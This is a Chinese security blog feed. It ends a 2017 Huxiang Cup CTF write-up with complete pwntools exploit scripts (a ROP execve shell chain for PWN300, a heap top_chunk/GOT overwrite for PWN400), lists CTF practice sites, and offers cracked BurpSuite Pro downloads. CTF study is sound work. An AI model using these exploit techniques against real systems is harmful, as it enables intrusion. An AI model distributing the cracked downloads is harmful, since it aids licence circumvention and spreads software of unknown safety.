class="comment"># pop eax ; ret</span></span><br><span class="line">p.append(<span class="built_in">eval</span>(<span class="string">'0x'</span>+binascii.b2a_hex(<span class="string">'nib/'</span>)))</span><br><span class="line">p.append( 0x080a1dad)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p.append( 0x0806ed0a)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append( 0x080ea064)  <span class="comment"># @ .data + 4</span></span><br><span class="line">p.append( 0x080bb406)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">p.append(<span class="built_in">eval</span>(<span class="string">'0x'</span>+binascii.b2a_hex(<span class="string">'hs//'</span>)))</span><br><span class="line">p.append(0x080a1dad)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p.append(0x0806ed0a)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append(0x080ea068)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p.append(0x08054730)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p.append(0x080a1dad)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p.append(0x080481c9)  <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p.append(0x080ea060)  <span class="comment"># @ .data</span></span><br><span class="line">p.append(0x0806ed31)  <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">p.append(0x080ea068)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p.append(0x080ea060)  <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p.append(0x0806ed0a)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append(0x080ea068)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p.append(0x08054730)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x08049781)  <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">tempnum=0</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.recvuntil(<span class="string">'How many times do you want to calculate:'</span>)</span><br><span class="line">io.sendline(<span class="string">'255'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(0,16):</span><br><span class="line">    io.recvuntil(<span class="string">'5 Save the result\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'input the integer x:'</span>)</span><br><span class="line">    io.sendline(str(tempnum))</span><br><span class="line">    io.recvuntil(<span class="string">'input the integer y:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> p:</span><br><span class="line">    io.recvuntil(<span class="string">'5 Save the result\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'input the integer x:'</span>)</span><br><span class="line">    io.sendline(str(ct.c_int32(j).value))</span><br><span class="line">    io.recvuntil(<span class="string">'input the integer y:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'5 Save the result\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'5'</span>)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>注意一点就是，就是程序在 return 0之前会调用 free，而为了保证 free 函数的正常运行，前十六次计算的结果必须为0，后面的计算结果就可以随意了。最后 getshell 的效果是：</p><p><img src="pwn300_7.jpg" alt></p><h1 id="PWN-400"><a href="#PWN-400" class="headerlink" title="PWN 400"></a>PWN 400</h1><p>把pwn 400 直接拖入 ida 中：<br>main 函数：</p><p><img src="pwn400_1.jpg" alt></p><p>Create Profile 函数：</p><p><img src="pwn400_2.jpg" alt></p><p>Print Profile 函数：</p><p><img src="pwn400_3.jpg" alt></p><p>Update Profile 函数：</p><p><img src="pwn400_4.jpg" alt></p><p>Exchange 函数：</p><p><img src="pwn400_5.jpg" alt></p><p>这个题目有点难度，题目的流程不难，首先创建 Profile，当名字的长度小于8的时候会把数据写入 bss 段，数据的长度值 nbytes 会放入数据的后面，大于8的时候会 malloc 一个空间，把输入写入堆中，而指针会保存在 bss 段，而数据的长度值 nbytes 也会保存在指针的后面，更新 Profile 的时候也会做相同的操作，打印数据的时候会把名字输出，可以用这个功能泄露程序任意地址的任意数据，Exchange 可以交换两个地址的数据，可以利用这个来 getshell</p><p><img src="pwn400_6.jpg" alt></p><p>先运行一下程序看一下这个程序干了啥：</p><p><img src="pwn400_7.jpg" alt></p><p>再看看程序开启了哪些保护：</p><p><img src="pwn400_8.jpg" alt></p><p>看到这个程序开了栈不可执行，于是肯定就会想到用 rop 来做。</p><p>这个程序有两个地方可以利用：<br>（1）是创建的 Profile，名字长度如果小于8就把数据写入 bss 段中，但是你可以输入负数，如果是负数的话，就可以造成整数溢出，你就可以在bss段中写入任意长度的数据，就可以覆盖后面的长度值 nbytes 为任意数值，这样你可以伪造一个任意长度的数据，在 print 函数中可以看到如果 nbytes 长度小于8就去读 bss 中的数据，如果 nbytes 大于8就会去读 bss 中的指针指向的数据，如果我们伪造 nbytes 的话就可以让 print Profile 函数去读任意地址的数据，通过 got 表可以计算出 libc 的基地址<br>（2）是 Exchange 函数可以交换任意两个指针，但是两个指针都是要有写权限的，程序中权限可以通过 vmmap 来查看</p><p><img src="pwn400_9.jpg" alt></p><p>这个地方是难点，解决方法是：用 top_chunk 指针和 read@got 指针进行交换，第二次堆分<br>配时候可以分配到我想要的位置，就可以把想要数据写入 read@got 中，当下回调用 read 的时候就可以跳到 MAGIC 中 getshell 了，关于 top_chunk 的介绍可以参考<a href="https://www.cnblogs.com/alisecurity/p/5486458.html" target="_blank" rel="noopener">https://www.cnblogs.com/alisecurity/p/5486458.html</a><br>我的 exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__Auther__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import binascii</span><br><span class="line">context(terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>], arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">localMAGIC=0x5fbc6</span><br><span class="line">localmain_arena=0x001B2780</span><br><span class="line"></span><br><span class="line">def debug(addr = <span class="string">'0x08048BA6'</span>):</span><br><span class="line">    raw_input(<span class="string">'debug:'</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">"b *"</span> + addr)</span><br><span class="line"></span><br><span class="line">def base_addr(prog_addr,sysmbol,offset):</span><br><span class="line">    <span class="keyword">if</span> sysmbol==<span class="string">'min'</span>:</span><br><span class="line">        <span class="built_in">return</span> <span class="built_in">eval</span>(prog_addr)-offset</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> <span class="built_in">eval</span>(prog_addr) + offset</span><br><span class="line"></span><br><span class="line">def cr_up_profile(choose,name_len,name,age):</span><br><span class="line">    io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    io.send(choose)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(name_len)</span><br><span class="line">    io.recvuntil(<span class="string">'Input your name:\n'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'Input your age:\n'</span>)</span><br><span class="line">    io.sendline(age)</span><br><span class="line"></span><br><span class="line">def print_profile(address):</span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    data = io.recv().splitlines()[0][11:15][::-1]</span><br><span class="line">    log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="built_in">return</span> data</span><br><span class="line"></span><br><span class="line">def change_age(address1,address2):</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Person 1:'</span>)</span><br><span class="line">    io.send(p32(address1))</span><br><span class="line">    io.recvuntil(<span class="string">'Person 2:'</span>)</span><br><span class="line">    io.send(p32(address2))</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line">    payload = p32(address) + <span class="string">'a'</span> * 4 + p32(10)</span><br><span class="line">    cr_up_profile(<span class="string">'3'</span>,<span class="string">'-10'</span>,payload,<span class="string">'10'</span>)</span><br><span class="line">    <span class="built_in">return</span> print_profile(address)</span><br><span class="line"></span><br><span class="line">def getshell(address1,address2,address3):</span><br><span class="line">    change_age(address1,address2)</span><br><span class="line">    cr_up_profile(<span class="string">'3'</span>,<span class="string">'20'</span>,address3,<span class="string">'20'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc addr</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">symbols = [<span class="string">'environ'</span>, <span class="string">'_environ'</span>, <span class="string">'__environ'</span>]</span><br><span class="line"><span class="keyword">for</span> symbol <span class="keyword">in</span> symbols:</span><br><span class="line">    environ = libc.symbols[symbol]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"environ:"</span>+hex(environ)</span><br><span class="line">head=libc.symbols[<span class="string">'__curbrk'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"head:"</span>+hex(head)</span><br><span class="line">system=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system:"</span>+hex(system)</span><br><span class="line">__malloc_hook=libc.got[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"__malloc_hook:"</span>+hex(__malloc_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment">#profile addr</span></span><br><span class="line">elf = ELF(<span class="string">'/home/h11p/hackme/huxiangbei/profile'</span>)</span><br><span class="line">printf_addr=elf.got[<span class="string">'printf'</span>]</span><br><span class="line">puts_addr=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">atoi_addr=elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">malloc_addr=elf.got[<span class="string">'malloc'</span>]</span><br><span class="line">__isoc99_scanf_addr=elf.got[<span class="string">'__isoc99_scanf'</span>]</span><br><span class="line">read_addr=elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"printf_addr:"</span>+hex(printf_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"puts_addr:"</span>+hex(puts_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"atoi_addr:"</span>+hex(atoi_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"malloc_addr:"</span>+hex(malloc_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"__isoc99_scanf_addr:"</span>+hex(__isoc99_scanf_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"read_addr:"</span>+hex(read_addr)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'/home/h11p/hackme/huxiangbei/profile'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#create profile</span></span><br><span class="line">cr_up_profile(<span class="string">'1'</span>,<span class="string">'10'</span>,<span class="string">'a'</span>*8,<span class="string">'1'</span>*12)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc base</span></span><br><span class="line">libc_base=base_addr(<span class="string">"0x"</span>+binascii.b2a_hex(leak(printf_addr)),<span class="string">'min'</span>,0x49670) <span class="comment">#0x49670</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get libc func addr</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"libc_base:"</span>+hex(libc_base)</span><br><span class="line">MAGIC_addr=libc_base+localMAGIC</span><br><span class="line"><span class="built_in">print</span> <span class="string">"MAGIC_addr:"</span>+hex(MAGIC_addr)</span><br><span class="line">environ_addr=libc_base+environ</span><br><span class="line"><span class="built_in">print</span> <span class="string">"environ_addr:"</span>+hex(environ_addr)</span><br><span class="line">head_addr=libc_base+head</span><br><span class="line"><span class="built_in">print</span> <span class="string">"head_addr:"</span>+hex(head_addr)</span><br><span class="line">main_arena_addr=libc_base+localmain_arena</span><br><span class="line"><span class="built_in">print</span> <span class="string">"main_arena_addr:"</span>+hex(main_arena_addr)</span><br><span class="line">topchunk=main_arena_addr+0x30</span><br><span class="line"><span class="built_in">print</span> <span class="string">"topchunk:"</span>+hex(topchunk)</span><br><span class="line">system_addr=libc_base+system</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system_addr:"</span>+hex(system_addr)</span><br><span class="line">__malloc_hook_addr=libc_base+__malloc_hook</span><br><span class="line"><span class="built_in">print</span> <span class="string">"__malloc_hook_addr:"</span>+hex(__malloc_hook_addr)</span><br><span class="line"></span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">libc_start_main=base_addr("0x"+binascii.b2a_hex(leak(environ_addr)),'</span>min<span class="string">',0xa0)</span></span><br><span class="line"><span class="string">print "libc_start_main:"+hex(libc_start_main)</span></span><br><span class="line"><span class="string">head_addr_input=base_addr('</span>0x<span class="string">'+binascii.b2a_hex(leak(head_addr+1))+'</span>00<span class="string">','</span>min<span class="string">',0x20fe8)</span></span><br><span class="line"><span class="string">print "head_addr_input:"+hex(head_addr_input)</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">getshell(topchunk-0xc,0x0804B004-0x8,<span class="string">'a'</span>*8+p32(MAGIC_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>效果是：</p><p>Ps:寻找 MAGIC 可以用 one_gadget 这个工具，工具地址在： <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">https://github.com/david942j/one_gadget</a></p><p><img src="pwn400_10.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2017湖湘杯网络安全大赛Writeup&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://archimesan.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CTF学习</title>
    <link href="http://archimesan.me/2017/12/14/CTF%E5%AD%A6%E4%B9%A0/"/>
    <id>http://archimesan.me/2017/12/14/CTF学习/</id>
    <published>2017-12-14T05:11:10.000Z</published>
    <updated>2019-03-22T07:03:56.790Z</updated>
    
    <content type="html"><![CDATA[<p>一些CTF学习的网站</p><a id="more"></a><h1 id="CTF-资讯"><a href="#CTF-资讯" class="headerlink" title=" CTF 资讯 "></a><font size="5"> CTF 资讯 </font></h1><p><a href="https://www.xctf.org.cn/" target="_blank" rel="noopener"><em>XCTF联赛</em></a></p><p><a href="http://bobao.350.cn/" target="_blank" rel="noopener"><em>350安全客</em></a></p><p><a href="https://ctftime.org/event/list/upcoming" target="_blank" rel="noopener"><em>CTFTIME</em></a></p><h1 id="CTF练习"><a href="#CTF练习" class="headerlink" title=" CTF练习 "></a><font size="5"> CTF练习 </font></h1><h1 id="BIN"><a href="#BIN" class="headerlink" title="BIN:"></a>BIN:</h1><p><a href="http://reversing.kr" target="_blank" rel="noopener"><em>Reverse逆向学习</em></a></p><p><a href="http://pwnable.kr/" target="_blank" rel="noopener"><em>Pwnable</em></a></p><p><a href="http://pwnable.tw" target="_blank" rel="noopener"><em>Pwnable (台湾)</em></a></p><p><a href="http://security.cs.rpi.edu/courses/binexp-spring2015" target="_blank" rel="noopener"><em>Modern Binary Exploitation</em></a></p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener"><em>XSS 挑战</em></a></p><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener"><em>Sqli-lbas</em></a></p><h1 id="综合练习"><a href="#综合练习" class="headerlink" title=" 综合练习 "></a><font size="5"> 综合练习 </font></h1><p><a href="http://hackinglab.cn/" target="_blank" rel="noopener"><em>网络信息攻防学习平台</em></a></p><p><a href="http://www.baimaoxueyuan.com/" target="_blank" rel="noopener"><em>白茅学院</em></a></p><p><a href="http://captf.com/" target="_blank" rel="noopener"><em>CTF题目</em></a></p><p><a href="http://www.shiyanbar.com/ctf/index" target="_blank" rel="noopener"><em>西普实验吧</em></a></p><p><a href="http://www.hetianlab.com/CTFrace.html" target="_blank" rel="noopener"><em>合天CTF</em></a></p><p><a href="http://www.ichunqiu.com/tiaozhans" target="_blank" rel="noopener"><em>I春秋CTF挑战</em></a></p><p><a href="http://ctf.idf.cn/" target="_blank" rel="noopener"><em>IDF 实验室</em></a></p><h1 id="OJ平台以及CTF赛事复盘"><a href="#OJ平台以及CTF赛事复盘" class="headerlink" title=" OJ平台以及CTF赛事复盘 "></a><font size="5"> OJ平台以及CTF赛事复盘 </font></h1><p><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener"><em>XCTF-OJ</em></a></p><p><a href="http://pwnhub.cn" target="_blank" rel="noopener"><em>Pwnhub</em></a></p><p><a href="https://www.jarvisoj.com/" target="_blank" rel="noopener"><em>Jarvisoj -汪师傅OJ平台</em></a></p><p><a href="http://ctf.nuptsast.com" target="_blank" rel="noopener"><em>南京邮电大学复盘</em></a></p><h1 id="各种姿势的学习平台"><a href="#各种姿势的学习平台" class="headerlink" title=" 各种姿势的学习平台 "></a><font size="5"> 各种姿势的学习平台 </font></h1><p><a href="http://www.52pojie.cn/" target="_blank" rel="noopener"><em>吾爱破解</em></a></p><p><a href="http://bbs.pediy.com/" target="_blank" rel="noopener"><em>看雪论坛</em></a></p><p><a href="https://www.t00ls.net/" target="_blank" rel="noopener"><em>T00ls</em></a></p><h1 id="CTF-Writeup-解题报告"><a href="#CTF-Writeup-解题报告" class="headerlink" title=" CTF-Writeup 解题报告 "></a><font size="5"> CTF-Writeup 解题报告 </font></h1><p><a href="http://bobao.350.cn/ctf/" target="_blank" rel="noopener"><em>350安全客</em></a></p><p><a href="https://github.com/ctfs/" target="_blank" rel="noopener"><em>CTF Writeup -github</em></a></p><p><a href="https://github.com/VulnHub/ctf-writeups" target="_blank" rel="noopener"><em>Writeups</em></a></p><p>Good good study,day day up !</p><p><a href="http://archimesan.me/">回到主页</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些CTF学习的网站&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://archimesan.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite 永久使用版（附下载）</title>
    <link href="http://archimesan.me/2017/12/13/burpsuite/"/>
    <id>http://archimesan.me/2017/12/13/burpsuite/</id>
    <published>2017-12-13T14:30:10.000Z</published>
    <updated>2019-03-22T07:03:56.806Z</updated>
    
    <content type="html"><![CDATA[<p>BurpSuite 破解版多个版本下载</p><a id="more"></a><h1 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h1><p>1、BurpSuite 永久使用版，并非最新的 BurpSuite 破解版。</p><p>2、此版本同样是 LarryLau 破解的，但是授权日期是到 2099-12-3</p><p>3、本文将汇总一些关于 BurpSuite 的教程等，请认真查看。 </p><h1 id="BurpSuite-介绍"><a href="#BurpSuite-介绍" class="headerlink" title="BurpSuite 介绍"></a>BurpSuite 介绍</h1><p>借用一下 52pojie 的文章中的描述信息：<a href="https://www.52pojie.cn/thread-648337-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-648337-1-1.html</a></p><p>Burp Suite 是用于攻击web应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。</p><p>所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代{过}{滤}理，日志，警报的一个强大的可扩展的框架。</p><p><img src="1.png" alt></p><p><img src="2.png" alt></p><p><img src="3.png" alt></p><p><img src="4.png" alt></p><p><img src="5.png" alt></p><p><img src="6.png" alt></p><p><img src="7.png" alt></p><p><img src="8.png" alt></p><p><img src="9.png" alt></p><p><img src="10.png" alt></p><p>#burpSuite破解版下载</p><p>BurpSuiteV1.5.20 破解版，授权日期到 2099-12-3</p><p><a href="burpsuite_pro_v1.5.20.rar">burpsuite_pro_v1.5.20</a></p><p>BurpSuiteV1.6 破解版，授权日期到 2099-12-3</p><p><a href="Burpsuite+Pro+1.6.rar">Burpsuite+Pro+1.6</a></p><p>BurpSuite 无限制版，安全性自测。</p><p><a href="Burp-Suite-Professional-1.7.26.rar">BurpUnlimited</a></p><p>感谢作者：Larry_Lau</p><p>若使用 BurpSuite 的时候，依然提示授权过期或者是 BurpSuite 停止响应的情况，请做如下操作：</p><p><img src="11.png" alt></p><p>执行 Clean burp from computer，这样会清理 burp 的授权及临时文件等，还你一个干净的 burp 使用环境，然后重新执行 burploader.jar。</p><p>执行如下操作，将对你的眼睛很有好处，同样还会解决中文乱码的问题，请看图：</p><p><img src="12.png" alt></p><h1 id="BurpSuite-教程"><a href="#BurpSuite-教程" class="headerlink" title="BurpSuite 教程"></a>BurpSuite 教程</h1><p><a href="https://t0data.gitbooks.io/burpsuite/content/" target="_blank" rel="noopener">BurpSuite 实战指南</a></p><p><a href="https://www.waitalone.cn/burpsuite-series-uses-video-tutorials.html" target="_blank" rel="noopener">BurpSuite 系列使用视频教程</a></p><p><a href="https://www.waitalone.cn/burpsuite-sqlmap.html" target="_blank" rel="noopener">在BurpSuite 中集成 Sqlmap</a></p><p><a href="https://www.waitalone.cn/burpsuite-plugins.html" target="_blank" rel="noopener">BurpSuite 中的安全测试插件推荐</a></p><p><a href="https://www.waitalone.cn/burpsuite-js.html" target="_blank" rel="noopener">利用 BurpSuite 突破 JS 限制登陆后台</a></p><p>BurpSuite 实战指南请认真看完，强烈推荐。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BurpSuite 破解版多个版本下载&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具下载" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BD/"/>
    
  </entry>
  
</feed>
